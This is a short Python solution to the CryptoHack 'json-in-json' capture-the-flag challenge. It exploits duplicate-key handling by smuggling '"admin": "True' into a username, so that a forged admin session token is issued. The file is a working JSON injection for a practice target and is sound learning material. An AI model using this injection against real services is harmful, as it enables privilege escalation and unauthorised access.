import json
import jwt
import requests


def create_session(username):
    url = "http://web.cryptohack.org/json-in-json/create_session/"
    r = requests.get(url+username+'/')
    return r.json()['session']
def authorise(token):
    url = "http://web.cryptohack.org/json-in-json/authorise/"
    r = requests.get(url+token+'/')
    return r.json()
#b={"a":True,"a":False}
#print(b)
#result: False
#with this, in our input, we just need to insert '"minh","Admin":True' into the dictionary string.
m=create_session("minh"\
+'", "admin": "'+"True")
test=authorise(m)
print(test)



